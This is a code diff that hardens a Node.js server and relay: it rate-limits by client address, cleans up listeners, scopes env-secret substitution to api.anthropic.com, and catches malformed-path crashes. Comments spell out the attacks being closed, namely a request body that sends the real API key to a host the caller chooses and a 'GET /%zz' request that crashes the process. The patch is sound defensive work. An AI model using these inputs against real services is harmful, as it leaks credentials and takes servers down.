@@ -166,9 +166,18 @@ function readJsonBody(req) {
   });
 }
 
+// The connection's own address, used only as a rate-limiting bucket key —
+// never as authority for anything. Rate limits used to key on the name in
+// the request body, which the sender chooses, so rotating it reset the
+// budget; this is the one thing about a request the caller can't restate
+// at will.
+function clientKeyFor(req) {
+  return req.socket.remoteAddress || '';
+}
+
 function handleRelayClaim(req, res) {
   readJsonBody(req).then(function (body) {
-    const result = relay.claim(body && body.name, body && body.sig);
+    const result = relay.claim(body && body.name, body && body.sig, clientKeyFor(req));
     res.writeHead(result.status, { 'Content-Type': 'application/json; charset=utf-8' });
     res.end(JSON.stringify(result.ok ? result.peer : { error: result.error }));
   }).catch(function () {
@@ -200,11 +209,21 @@ function handleSseConnection(req, res) {
     res.write(':\n\n');
   }, 20000);
 
-  req.on('close', () => {
+  // Bound to 'error' as well as 'close': a socket that dies without a
+  // clean close (a killed browser, a dropped network) never fired 'close',
+  // leaving the 20-second heartbeat writing to a dead response forever and
+  // both listeners attached. Guarded so it runs once whichever fires first.
+  let torndown = false;
+  function teardown() {
+    if (torndown) return;
+    torndown = true;
     clearInterval(heartbeat);
     jobs.events.off('job-updated', onJobUpdated);
     jobs.events.off('job-deleted', onJobDeleted);
-  });
+  }
+  req.on('close', teardown);
+  req.on('error', teardown);
+  res.on('error', teardown);
 }
 
 function handleCreateJob(req, res) {
@@ -369,12 +388,27 @@ function handleFsAnnotate(req, res) {
 // can't be used to leak an unrelated server env var to an arbitrary URL a
 // caller names. Add a name here only when something genuinely needs to
 // reference it this way.
-const PROXY_ENV_SUBSTITUTION_ALLOWLIST = ['ANTHROPIC_API_KEY'];
+// Each entry pairs a variable NAME with the destination hosts it may be
+// sent to. The name alone was not enough: gating which env var could be
+// substituted, without gating where it went, meant any caller could post
+// {"url":"https://somewhere-else","headers":{"x-api-key":"${ENV:ANTHROPIC_API_KEY}"}}
+// and the server would faithfully hand the real key to a host of the
+// caller's choosing. The allow-list stopped an UNRELATED variable reaching
+// an arbitrary URL; it did nothing for the one variable it allowed. A
+// secret is scoped by name AND by recipient or it isn't scoped.
+const PROXY_ENV_SUBSTITUTION_ALLOWLIST = [
+  { name: 'ANTHROPIC_API_KEY', hosts: ['api.anthropic.com'] },
+];
 
-function substituteEnvPlaceholders(value) {
+function substituteEnvPlaceholders(value, targetHost) {
   if (typeof value !== 'string') return value;
   return value.replace(/\$\{ENV:([A-Z0-9_]+)\}/g, (match, varName) => {
-    if (PROXY_ENV_SUBSTITUTION_ALLOWLIST.indexOf(varName) === -1) return match; // not allowlisted — leave the literal placeholder, let the target API reject the bad auth rather than silently substituting nothing
+    // Not allowlisted, or allowlisted but pointed somewhere it isn't meant
+    // to go — leave the literal placeholder either way, and let the target
+    // reject the bad auth rather than silently substituting nothing.
+    const entry = PROXY_ENV_SUBSTITUTION_ALLOWLIST.find((row) => row.name === varName);
+    if (!entry) return match;
+    if (entry.hosts.indexOf(targetHost) === -1) return match;
     return process.env[varName] !== undefined ? process.env[varName] : match;
   });
 }
@@ -399,9 +433,15 @@ function handleGenericProxy(req, res) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), body.timeoutMs || 10000);
 
+    // Whatever host the outbound request will actually reach — the only
+    // thing that decides whether a secret is allowed into these headers.
+    let targetHost = '';
+    try { targetHost = new URL(body.url).hostname.toLowerCase(); }
+    catch (err) { /* unparseable — no host matches, so nothing substitutes; fetch fails below on its own */ }
+
     const fetchOptions = { method: body.method || 'GET', signal: controller.signal };
     const headers = Object.assign({}, body.body !== undefined ? { 'Content-Type': 'application/json' } : {}, body.headers || {});
-    Object.keys(headers).forEach((key) => { headers[key] = substituteEnvPlaceholders(headers[key]); });
+    Object.keys(headers).forEach((key) => { headers[key] = substituteEnvPlaceholders(headers[key], targetHost); });
     if (Object.keys(headers).length > 0) fetchOptions.headers = headers;
     if (body.body !== undefined) fetchOptions.body = JSON.stringify(body.body);
 
@@ -494,9 +534,29 @@ const server = http.createServer((req, res) => {
     requestCounters.byStatusClass[bucket] = (requestCounters.byStatusClass[bucket] || 0) + 1;
   });
 
-  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
-  const pathname = decodeURIComponent(url.pathname);
-  
+  // Both of these parse caller-controlled bytes, and both can throw:
+  // decodeURIComponent on a malformed escape ('/%zz', '/%'), and the URL
+  // constructor on a Host header it can't make an origin out of. An
+  // uncaught throw HERE is not a bad response, it's a dead process — the
+  // handler runs outside any try, so the exception unwinds straight out of
+  // http's 'request' emit and ends Node.
+  //
+  // That mattered most on a --relay, where this runs BEFORE
+  // isRelayPublicPath narrows anything: a single unauthenticated
+  // `GET /%zz` from the internet took the public mailbox down, and
+  // systemd's Restart=on-failure just made it a three-second outage per
+  // request rather than a permanent one. Answer 400 and stay up.
+  let url;
+  let pathname;
+  try {
+    url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+    pathname = decodeURIComponent(url.pathname);
+  } catch (err) {
+    res.writeHead(400, { 'Content-Type': 'text/plain; charset=utf-8' });
+    res.end('Bad request: malformed request path');
+    return;
+  }
+
   if (relayMode && !isRelayPublicPath(req.method, pathname)) {
     res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
     res.end('Not found');
@@ -520,7 +580,7 @@ const server = http.createServer((req, res) => {
   
   function handleRelaySend(req, res) {
     readJsonBody(req).then(function (body) {
-      const result = relay.send(body && body.from, body && body.to, body && body.text, body && body.sig);
+      const result = relay.send(body && body.from, body && body.to, body && body.text, body && body.sig, clientKeyFor(req));
       res.writeHead(result.status, { 'Content-Type': 'application/json; charset=utf-8' });
       res.end(JSON.stringify(result.ok ? result.message : { error: result.error }));
     }).catch(function () {
@@ -530,7 +590,7 @@ const server = http.createServer((req, res) => {
   }
 
   function handleRelayInbox(req, res, url) {
-    var result = relay.inbox(url.searchParams.get('name') || '');
+    var result = relay.inbox(url.searchParams.get('name') || '', url.searchParams.get('sig') || '');
     res.writeHead(result.status, { 'Content-Type': 'application/json; charset=utf-8' });
     res.end(JSON.stringify(result.ok ? { messages: result.messages } : { error: result.error }));
   }
@@ -724,6 +784,20 @@ server.on('error', (err) => {
 server.listen(port, BIND_HOST, () => {
   if (relayMode) {
     console.log(`Relay listening on ${BIND_HOST}:${port} — PUBLIC, no loopback or Host restriction`);
+    // relayAuth.loadAllow treats a missing or unreadable allow.json as
+    // mode 'open': any name claimable by anyone, any sender accepted, no
+    // signature required. That is the right default for a lab relay and
+    // the wrong one for a public box, and until now the two were
+    // indistinguishable from the console — an open relay looked exactly
+    // like a working one right up until someone else claimed your name.
+    // Say which one this is.
+    if (require('./relayAuth').loadAllow(ROOT_DIR).mode === 'open') {
+      console.warn(
+        '    WARNING: no relay-state/allow.json — this relay is OPEN. Anyone who can reach it\n' +
+        '    may claim any name, send as anyone, and read any mailbox. Create relay-state/allow.json\n' +
+        '    (a { "keys": [...] } list) to require signed claims and sends.'
+      );
+    }
   } else {
     console.log(`Server listening on http://localhost:${port}`);
   }
